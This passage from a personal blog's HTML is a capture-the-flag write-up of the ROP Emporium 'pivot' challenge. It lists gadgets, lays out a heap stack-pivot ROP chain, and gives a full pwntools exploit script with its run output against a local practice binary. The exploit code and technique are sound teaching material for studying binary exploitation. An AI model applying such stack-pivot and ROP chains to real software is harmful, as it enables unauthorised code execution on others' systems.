+0x00000000004008fa: test byte ptr <span style="color:#f92672">[</span>rax<span style="color:#f92672">]</span>, al; add byte ptr <span style="color:#f92672">[</span>rax<span style="color:#f92672">]</span>, al; add byte ptr <span style="color:#f92672">[</span>rax<span style="color:#f92672">]</span>, al; pop rbp; ret;
+0x00000000004008eb: test eax, eax; je 0x900; pop rbp; mov edi, 0x602078; jmp rax;
+0x0000000000400939: test eax, eax; je 0x948; pop rbp; mov edi, 0x602078; jmp rax;
+0x0000000000400986: test eax, eax; je 0x97b; push rbp; mov rbp, rsp; call rax;
+0x00000000004008ea: test rax, rax; je 0x900; pop rbp; mov edi, 0x602078; jmp rax;
+0x0000000000400938: test rax, rax; je 0x948; pop rbp; mov edi, 0x602078; jmp rax;
+0x0000000000400985: test rax, rax; je 0x97b; push rbp; mov rbp, rsp; call rax;
+0x0000000000400b03: xchg eax, esp; ret;
+0x0000000000400b02: xchg rax, rsp; ret;
+0x0000000000400989: int1; push rbp; mov rbp, rsp; call rax;
+0x0000000000400a39: leave; ret;
+0x0000000000400adf: nop; leave; ret;
+0x00000000004007c9: ret;
+</code></pre></div><p>We can use these gadgets:</p>
+<ol>
+<li>pop <code>rax</code> to get <code>foothold_function</code> got address into it: <code>0x0000000000400b00: pop rax; ret;</code></li>
+<li>Move the actual value, which is <code>foothold_function</code> address into <code>rax</code>: <code>0x0000000000400b05: mov rax, qword ptr [rax]; ret;</code></li>
+<li>pop <code>rbp</code> to get our offset (<code>0x14e</code>) into it: <code>0x0000000000400900: pop rbp; ret;</code></li>
+<li>add <code>rbp</code> to <code>rax</code>: <code>0x0000000000400b09: add rax, rbp; ret;</code></li>
+<li>call the function: <code>0x000000000040098e: call rax;</code></li>
+</ol>
+<p>After that, for our buffer overflow, we can again use the <code>pop rax</code> gadget to get the heap address (which we get from the binary output) into it, and then swap <code>rsp</code> and <code>rax</code> (<code>0x0000000000400b02: xchg rax, rsp; ret;</code>) so we&rsquo;ll get our pivot - the <code>rsp</code> will point to the heap memory!</p>
+<h3 id="technical-chain">Technical Chain</h3>
+<ol>
+<li>
+<p>Call <code>foothold_function</code></p>
+</li>
+<li>
+<p>Load effective address of <code>foothold@got</code></p>
+</li>
+<li>
+<p>Add <code>0x14E</code> to that register</p>
+</li>
+<li>
+<p>Return to the address in that register</p>
+</li>
+<li>
+<p>Calculate <code>ret2win</code> address and return to it</p>
+</li>
+</ol>
+<p>Stack chain:</p>
+<ol>
+<li>
+<p><code>xchg rax, rsp; ret;</code></p>
+</li>
+<li>
+<p><code>pop rax; ret</code></p>
+</li>
+<li>
+<p>LEAKED HEAP ADDRESS</p>
+</li>
+</ol>
+<p>Heap ROP chain:</p>
+<ol>
+<li>
+<p><code>0x0000000000400850</code> (foothold plt)</p>
+</li>
+<li>
+<p><code>pop rax; ret;</code></p>
+</li>
+<li>
+<p><code>0x000000602048</code> (foothold got)</p>
+</li>
+<li>
+<p><code>pop rbp; ret;</code></p>
+</li>
+<li>
+<p><code>0x14E</code></p>
+</li>
+<li>
+<p><code>add rax, rbp; ret;</code></p>
+</li>
+<li>
+<p>Load effective address of <code>rax</code></p>
+</li>
+<li>
+<p><code>call rax</code></p>
+</li>
+</ol>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+
+ret2win_offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0000000000000abe</span>
+foothold_offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0000000000000970</span>
+add_offset <span style="color:#f92672">=</span> ret2win_offset <span style="color:#f92672">-</span> foothold_offset
+foothold_plt <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0000000000400850</span>
+foothold_got <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x000000602048</span>
+
+xchg_rax <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x000400b02</span>
+pop_rax <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0000000000400b00</span>
+add_rax_rbp <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0000000000400b09</span>
+pop_rbp <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0000000000400900</span>
+load_rax <span style="color:#f92672">=</span><span style="color:#ae81ff">0x0000000000400b05</span>
+call_rax <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x000000000040098e</span>
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">exploit</span>():
+    p <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#34;./pivot&#34;</span>)
+    raw_input(str(p<span style="color:#f92672">.</span>proc<span style="color:#f92672">.</span>pid))
+
+
+    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;pivot: 0x&#34;</span>)
+    addr <span style="color:#f92672">=</span> int(p<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">12</span>), <span style="color:#ae81ff">16</span>)
+    log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;address received: 0x</span><span style="color:#e6db74">%x</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> addr)
+
+    p<span style="color:#f92672">.</span>recvrepeat(<span style="color:#ae81ff">0.2</span>)
+    <span style="color:#75715e"># stack pivot in heap</span>
+    stack_pivot <span style="color:#f92672">=</span> p64(foothold_plt)
+    stack_pivot <span style="color:#f92672">+=</span> p64(pop_rax)
+    stack_pivot <span style="color:#f92672">+=</span> p64(foothold_got)
+    stack_pivot <span style="color:#f92672">+=</span> p64(load_rax)
+    stack_pivot <span style="color:#f92672">+=</span> p64(pop_rbp)
+    stack_pivot <span style="color:#f92672">+=</span> p64(add_offset)
+    stack_pivot <span style="color:#f92672">+=</span> p64(add_rax_rbp)
+    stack_pivot <span style="color:#f92672">+=</span> p64(call_rax)
+
+    log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;sending heap data for the stack pivot&#34;</span>)
+    p<span style="color:#f92672">.</span>sendline(stack_pivot)
+    p<span style="color:#f92672">.</span>recvrepeat(<span style="color:#ae81ff">0.2</span>)
+
+    log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;sending first bof - stack pivoting&#34;</span>)
+    <span style="color:#75715e"># stack overflow, return to stack pivot</span>
+    stack_chain <span style="color:#f92672">=</span> p64(pop_rax)
+    stack_chain <span style="color:#f92672">+=</span> p64(addr)
+    stack_chain <span style="color:#f92672">+=</span> p64(xchg_rax)
+    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">40</span> <span style="color:#f92672">+</span> stack_chain)
+    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;foothold_function(), check out my .got.plt entry to gain a foothold into libpivot.so&#34;</span>)
+    log<span style="color:#f92672">.</span>success( p<span style="color:#f92672">.</span>recvall())
+
+
+<span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
+    exploit()
+
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">adamgold@adamgold-VirtualBox:~/Desktop/ctfs/pivot$ python exp.py
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Starting local process <span style="color:#e6db74">&#39;./pivot&#39;</span>: pid <span style="color:#ae81ff">13106</span>
+<span style="color:#ae81ff">13106</span>
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> address received: 0x7f2367d85f10
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> sending heap data <span style="color:#66d9ef">for</span> the stack pivot
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> sending first bof - stack pivoting
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Receiving all data: Done <span style="color:#f92672">(</span>33B<span style="color:#f92672">)</span>
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Process <span style="color:#e6db74">&#39;./pivot&#39;</span> stopped with exit code <span style="color:#ae81ff">0</span> <span style="color:#f92672">(</span>pid 13106<span style="color:#f92672">)</span>
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> ROPE<span style="color:#f92672">{</span>********<span style="color:#f92672">}</span>
+</code></pre></div>
+    </div>
+    
+      
+        <div class="pagination">
+          <div class="pagination__title">
+            <span class="pagination__title-h">Read other posts</span>
+            <hr />
+          </div>
+          <div class="pagination__buttons">
+            
+              <span class="button previous">
+                <a href="https://adamgold.github.io/posts/ropemporium-ret2csu/">
+                  <span class="button__icon">←</span>
+                  <span class="button__text">ROP Emporium Ret2CSU Writeup</span>
+                </a>
+              </span>
+            
+            
+              <span class="button next">
+                <a href="https://adamgold.github.io/posts/awesome-python-module-you-probably-arent-using/">
+                  <span class="button__text">Awesome Python modules you probably aren’t using (but should be)</span>
+                  <span class="button__icon">→</span>
+                </a>
+              </span>
+            
+          </div>
+        </div>
+      
+    
+
+
+    
+      
+        <div id="disqus_thread"></div>
+<script type="application/javascript">
+    var disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "adam-gold" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+
+      
+    
+
+    </div>
+
+      </div>
+
+      
+        <footer class="footer">
+  <div class="footer__inner">
+    
+      <a href="/" class="logo" style="text-decoration: none;">
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+  <path fill="none" d="M15 8l14.729 14.382L15 35.367"/>
+</svg>
+</span>
+    <span class="logo__text">Adam Gold</span>
+    <span class="logo__cursor"></span>
+  
+</a>
+
+      <div class="copyright">
+        <span>© 2020 Powered by <a href="https://gohugo.io" target="_blank" rel="noopener">Hugo</a></span>
+        <span>Theme created by <a href="https://twitter.com/panr" target="_blank" rel="noopener">panr</a></span>
+      </div>
+    
+  </div>
+</footer>
+
+<script src="https://adamgold.github.io/assets/main.js"></script>
+<script src="https://adamgold.github.io/assets/prism.js"></script>
+
+
+      
+    </div>
+
+    
+      
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'UA-171406341-1', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+
+    
+  </body>
+</html>
